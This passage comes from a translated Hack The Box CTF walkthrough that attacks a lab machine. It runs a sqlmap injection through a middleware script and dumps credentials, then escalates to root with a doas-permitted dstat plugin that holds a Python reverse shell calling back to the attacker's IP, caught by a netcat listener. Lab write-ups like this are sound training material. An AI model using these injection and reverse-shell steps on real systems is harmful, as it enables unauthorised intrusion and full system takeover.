httpd.serve_forever()<br/><br/><br/>print("[+] Starting MiddleWare Server")<br/>print("[+] Send payloads in http://localhost:8081/?id=*")<br/><br/>try:<br/> middleware_server(('0.0.0.0',8081))<br/>except KeyboardInterrupt:<br/> pass</span></pre><p id="1512" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">19.首先，运行python脚本，然后运行sqlmap命令</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="b3bc" class="nv ko iq nq b be nw nx l ny nz">sqlmap -u “http://localhost:8081/?id=1" -p “id”</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi py"><img src="../Images/11fa0d74423f90a12d8126a4d0114fcb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*7pfAU7L-yk8cRYNZ9vX9yw.gif"/></div></div></figure><p id="394e" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">20.我们有一些证书</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="0c81" class="nv ko iq nq b be nw nx l ny nz">+------+-------------------+----------+----------------------+<br/>| id   | email             | username | password             |<br/>+------+-------------------+----------+----------------------+<br/>| 1324 | player@player.htb | player   | PlayerOftheMatch2022 |<br/>+------+-------------------+----------+----------------------+</span></pre><p id="0979" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">21.让我们使用这些凭证通过ssh登录</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pz"><img src="../Images/cec6cdab7a37942c2b66c8c7786cbfb5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1110/format:webp/1*FMh52ygbtuGSVRcHECvMKQ.png"/></div></figure><h2 id="0cf2" class="my ko iq bd kp mz na dn kt nb nc dp kx lm nd ne kz lo nf ng lb lq nh ni ld nj bi translated"><strong class="ak"> 3。权限提升</strong></h2><ol class=""><li id="3529" class="lf lg iq lh b li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">使用linpeas并执行枚举(如果需要添加注释，我会简短地发布)</li></ol><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="fb8c" class="nv ko iq nq b be nw nx l ny nz">[+] Checking doas.conf<br/>permit nopass player as root cmd /usr/bin/dstat</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi qa"><img src="../Images/4089c6047c48e2f88283906c7b99a9f5.png" data-original-src="https://miro.medium.com/v2/resize:fit:954/format:webp/1*zbpIg8K-xnM5KB-euKysXA.png"/></div></figure><p id="d54d" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">2.用下面的代码在<code class="fe nn no np nq b">/usr/local/share/dstat/</code>中创建一个名为<code class="fe nn no np nq b">dstat_cyberw1ng.py</code>的python插件</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="ad90" class="nv ko iq nq b be nw nx l ny nz">/usr/local/share/dstat/ &amp;&amp; nano dstat_cyberw1ng.py</span></pre><pre class="qb nr nq ns bn nt nu bi"><span id="07d1" class="nv ko iq nq b be nw nx l ny nz">import socket,subprocess,os;<br/>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);<br/>s.connect((“&lt;your-IP&gt;”,2929));<br/><br/>os.dup2(s.fileno(),0);<br/>os.dup2(s.fileno(),1);<br/>os.dup2(s.fileno(),2);<br/><br/>import pty; pty.spawn(“/bin/sh”)</span></pre><p id="0066" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">3.确保在执行之前设置一个监听器</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="ffaf" class="nv ko iq nq b be nw nx l ny nz">nc -nvlp 2929</span></pre><p id="6abd" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">4.执行以下命令并导航至<code class="fe nn no np nq b">/root &amp;&amp; cat root.txt</code></p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="a357" class="nv ko iq nq b be nw nx l ny nz">doas -u root /usr/bin/dstat --cyberw1ng</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="oh oi di oj bf ok"><div class="gh gi qc"><img src="../Images/41c6cf4f4a11c9b7ad2475a5f746c179.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/1*yEiJBMON7gxf5nPXRGyBMQ.gif"/></div></div></figure><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="9820" class="nv ko iq nq b be nw nx l ny nz">Flag: 6314c94f697b6d45e83003814fd187c2</span></pre></div><div class="ab cl qd qe hu qf" role="separator"><span class="qg bw bk qh qi qj"/><span class="qg bw bk qh qi qj"/><span class="qg bw bk qh qi"/></div><div class="ij ik il im in"><p id="0677" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">请随时通过LinkedIn<a class="ae of" href="https://www.linkedin.com/in/karthikeyan-nagaraj" rel="noopener ugc nofollow" target="_blank">提出问题，并为我买一杯咖啡: )</a></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><a href="https://www.buymeacoffee.com/cyberw1ng"><div class="gh gi qk"><img src="../Images/526146222505b5b38f3be44233a6e2cc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*_XKw7n1dp-HYM9W8.png"/></div></a></figure><p id="5bdb" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">感谢您的阅读！！</p><p id="94be" class="pw-post-body-paragraph mf mg iq lh b li mi jr mj lk mk ju ml lm mn mo mp lo mr ms mt lq mv mw mx ls ij bi translated">黑客快乐~</p><pre class="kg kh ki kj gt nr nq ns bn nt nu bi"><span id="e580" class="nv ko iq nq b be nw nx l ny nz">Author: Karthikeyan Nagaraj ~ Cyberw1ng</span></pre></div></div>    
</body>
</html>